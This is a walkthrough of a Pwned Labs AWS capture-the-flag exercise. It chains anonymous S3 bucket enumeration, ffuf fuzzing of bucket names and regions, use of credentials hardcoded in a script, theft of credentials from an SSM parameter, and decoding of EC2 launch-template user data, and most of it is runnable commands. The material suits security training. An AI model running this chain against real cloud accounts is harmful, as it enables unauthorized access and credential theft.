https://pwnedlabs.io/labs/s3-bucket-brute-force-to-breach

Exposed bucket `hlogistics-web`. Enumerate:

```bash
aws s3 ls hlogistics-web --no-sign-request
	index.html
aws s3 cp s3://hlogistics-web/index.html . --no-sign-request
cat index.html
```

We find more buckets in the source code of the document:
- `hlogistics-staticfiles`
- `hlogistics-images`

List and download:

```bash
```bash
aws s3 ls hlogistics-images --no-sign-request
aws s3 ls hlogistics-staticfiles --no-sign-request
aws s3 cp s3://hlogistics-staticfiles . --recursive --no-sign-request
```

Nothing here so we must fuzz the regions and buckets for more info:

```bash
wget https://raw.githubusercontent.com/koaj/aws-s3-bucket-wordlist/master/list.txt
echo "us-west-1
us-west-2
us-east-1
us-east-2
cn-north-1
cn-northwest-1
eu-central-1
eu-north-1
eu-west-1
eu-west-2
eu-west-3
ap-northeast-1
ap-northeast-2
ap-northeast-3
ap-south-1
ap-southeast-1
ap-southeast-2
ca-central-1
me-south-1
sa-east-1
us-gov-east-1
us-gov-west-1
ap-east-1" > regions.txt

ffuf -u "https://hlogistics-ENVIRONMENT.s3.REGION.amazonaws.com" -w "regions.txt:REGION" -w "list.txt:ENVIRONMENT" -mc 200,403 -v 2>/dev/null
```

We find the bucket `hlogistics-storage` and region `us-east-1` return 200 status code. As well as  `hlogistics-beta` in region `eu-west-2`. Enumerate them!:

```bash
aws s3 ls hlogistics-storage --no-sign-request
aws s3 ls hlogistics-beta --no-sign-request
aws s3 cp s3://hlogistics-storage . --recursive --no-sign-request                  # Don't download all, too much
aws s3 cp s3://hlogistics-beta . --recursive --no-sign-request
	SystemTrackingPackagesTest.py
```

The python script in `hlogistics-beta` contains AWS creds, authenticate and enumerate the buckets:

```bash
aws configure --profile brute
aws sts get-caller-identity --profile brute
	iam
```

We now can authenticate with `ecollins` IAM user AWS credentials. Enumerate the policy:

```bash
aws iam list-user-policies --user-name ecollins --profile brute
aws iam get-user-policy --user-name ecollins --policy-name SSM_Parameter --profile brute
```

Getting the policy document reveals that we can run `GetParameter` and `DescribeParameters` action on the AWS SSM parameter named `lharris`. SSM allows the storage of sensitive information in configuration data.

```bash
aws ssm get-parameter --name lharris --profile brute
	Value
```

The `Value` field contains AWS creds for `lharris`. Configure and enumerate with `aws-enumerator`:

```bash
aws configure --profile lharris                         # This lab is not working as intended, the AWS creds are not valid
aws sts get-caller-identity --profile lharris
aws-enumerator cred -aws_access_key_id <ACCESS_KEY_ID> -aws_secret_access_key <SECRET_ACCESS_KEY> -aws_region eu-west-2
aws-enumerator enum -services all
	ec2
aws-enumerator dump -services ec2
```

Listing all available EC2 launch templates in the AWS account reveals a launch template named `SCHEDULER` . User data scripts to automatically configure EC2 instances are commonly added to launch templates. Enumerating the launch template to see if there are any user data defined.

```bash
aws ec2 describe-launch-templates --profile lharris
aws ec2 describe-launch-template-versions --launch-template-name SCHEDULER --query "LaunchTemplateVersions[0].LaunchTemplateData.UserData" --output text --profile lharris | base64 --decode
	FLAG
```